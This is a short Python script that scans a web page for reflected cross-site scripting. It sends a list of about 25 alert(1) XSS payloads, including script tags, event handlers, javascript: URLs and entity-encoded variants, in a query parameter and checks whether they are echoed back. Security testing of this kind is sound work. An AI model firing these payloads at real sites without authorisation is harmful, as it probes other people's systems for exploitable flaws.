import requests

def check_xss(url):
    # List of payloads to test for XSS
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<a href='javascript:alert(1)'>Click Me</a>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<object type='text/html' data='javascript:alert(1)'></object>",
        "<embed type='text/html' src='javascript:alert(1)'>",
        "<applet code='javascript:alert(1)'></applet>",
        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
        "<link rel='stylesheet' href='javascript:alert(1)'>",
        "<form action='javascript:alert(1)'>",
        "<button onclick='alert(1)'>Click Me</button>",
        "<input type='button' onclick='alert(1)' value='Click Me'>",
        "<textarea onclick='alert(1)'>Click Me</textarea>",
        "<select onclick='alert(1)'>Click Me</select>",
        "<option onclick='alert(1)'>Click Me</option>",
        "<details onclick='alert(1)'>Click Me</details>",
        "<summary onclick='alert(1)'>Click Me</summary>",
        "<style>body{background-image:url(javascript:alert(1))}</style>",
        "<style>body{background-image:url('javascript:alert(1)')}</style>",
        "<style>body{background-image:url(\"javascript:alert(1)\")}</style>",
        "<style>body{background-image:url(`javascript:alert(1)`)}</style>",
        "<style>body{background-image:url(&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;)}</style>",
        "<style>body{background-image:url(&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;)}</style>",
    ]

    for payload in payloads:
        # Try injecting into a parameter
        if "?" in url:
            test_url = url + "&xss=" + payload
        else:
            test_url = url + "?xss=" + payload

        try:
            resp = requests.get(test_url, timeout=5)
            if payload in resp.text:
                return True
        except Exception as e:
            print(f"Error occurred: {e}")
            pass

    return False

# Example usage
if __name__ == "__main__":
    test_url = "http://example.com/vulnerable-page"
    if check_xss(test_url):
        print("XSS vulnerability detected!")
    else:
        print("No XSS vulnerability detected.")
